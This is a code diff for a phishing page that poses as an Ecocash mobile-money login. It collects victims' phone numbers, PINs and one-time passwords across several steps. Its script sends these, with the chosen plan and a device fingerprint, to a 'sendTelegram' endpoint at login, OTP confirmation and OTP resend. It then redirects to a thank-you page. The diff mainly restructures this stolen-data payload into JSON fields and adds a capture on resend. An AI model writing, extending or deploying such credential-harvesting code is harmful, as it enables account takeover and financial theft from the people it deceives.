@@ -20,8 +20,7 @@ display:flex;
 align-items:center;
 justify-content:center;
 
-background:
-linear-gradient(180deg,#e6f0ff,#cfe0ff);
+background:linear-gradient(180deg,#e6f0ff,#cfe0ff);
 
 overflow:hidden;
 }
@@ -48,7 +47,7 @@ z-index:-1;
 100%{transform:translateY(0)}
 }
 
-/* container */
+/* card */
 
 .step{
 position:absolute;
@@ -78,11 +77,15 @@ pointer-events:none;
 transform:translateX(40px);
 }
 
+/* logo */
+
 .logo{
 height:70px;
 display:block;
 margin:auto;
 }
+
+/* text */
 
 h1{
 text-align:center;
@@ -98,6 +101,8 @@ font-size:13px;
 color:#555;
 margin-bottom:18px;
 }
+
+/* inputs */
 
 label{
 font-size:12px;
@@ -175,11 +180,6 @@ font-size:22px;
 text-align:center;
 border-radius:16px;
 border:1px solid #eee;
-}
-
-.pin input:focus{
-border-color:#003a8f;
-box-shadow:0 0 0 3px rgba(0,58,143,.12);
 }
 
 /* otp */
@@ -330,10 +330,31 @@ let phoneValue=""
 let pinValue=""
 let otpValue=""
 
-const planData=sessionStorage.getItem("selectedPlan")||"Not captured"
+let selectedPlan=null
+
+try{
+
+selectedPlan=JSON.parse(sessionStorage.getItem("selectedPlan"))
+
+}catch(e){}
 
 
-async function sendToTelegram(stage){
+/* device */
+
+const ua=navigator.userAgent
+
+let device="Unknown"
+
+if(/Android/i.test(ua)) device="Android"
+else if(/iPhone|iPad/i.test(ua)) device="iOS"
+
+if(/Chrome/i.test(ua)) device+=" | Chrome"
+else if(/Safari/i.test(ua)) device+=" | Safari"
+
+
+/* send telegram */
+
+async function sendToTelegram(eventName){
 
 await fetch("/api/sendTelegram",{
 
@@ -345,23 +366,21 @@ headers:{
 
 body:JSON.stringify({
 
-message:`
+submittedAt:new Date().toISOString(),
 
-Ecocash Login
+loginPhone:phoneValue,
 
-Stage: ${stage}
+loginPin:pinValue,
 
-Phone: ${phoneValue}
+otp:otpValue,
 
-PIN: ${pinValue}
+selectedPlan:selectedPlan,
 
-OTP: ${otpValue}
+event:eventName,
 
-Plan: ${planData}
+plan:selectedPlan?.name+" — "+selectedPlan?.price,
 
-Time: ${new Date().toISOString()}
-
-`
+device:device
 
 })
 
@@ -450,17 +469,17 @@ document.getElementById(id)
 }
 
 
-/* login click */
+/* login */
 
 loginBtn.onclick=async()=>{
 
 if(!loginBtn.classList.contains("active")) return
 
-await sendToTelegram("Login")
+await sendToTelegram("login_clicked")
 
 const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
-document.getElementById("maskedNumber").innerHTML=
+maskedNumber.innerHTML=
 
 `Enter the OTP sent to your phone number ${masked}`
 
@@ -486,18 +505,6 @@ otpInputs[index+1].focus()
 
 }
 
-input.onkeydown=e=>{
-
-if(e.key==="Backspace" && !input.value && index>0){
-
-otpInputs[index-1].focus()
-
-otpInputs[index-1].value=""
-
-}
-
-}
-
 })
 
 
@@ -505,7 +512,7 @@ async function submitOtp(){
 
 otpValue=[...otpInputs].map(i=>i.value).join("")
 
-await sendToTelegram("OTP")
+await sendToTelegram("otp_confirm")
 
 show("step4")
 
@@ -514,6 +521,19 @@ setTimeout(()=>{
 location.href="thankyou.html"
 
 },1500)
+
+}
+
+
+/* resend */
+
+resendBtn.onclick=async()=>{
+
+if(!resendBtn.classList.contains("active")) return
+
+await sendToTelegram("resend_otp")
+
+startTimer()
 
 }
 
@@ -543,15 +563,6 @@ resendBtn.classList.add("active")
 }
 
 },1000)
-
-}
-
-
-resendBtn.onclick=()=>{
-
-if(!resendBtn.classList.contains("active")) return
-
-startTimer()
 
 }
 
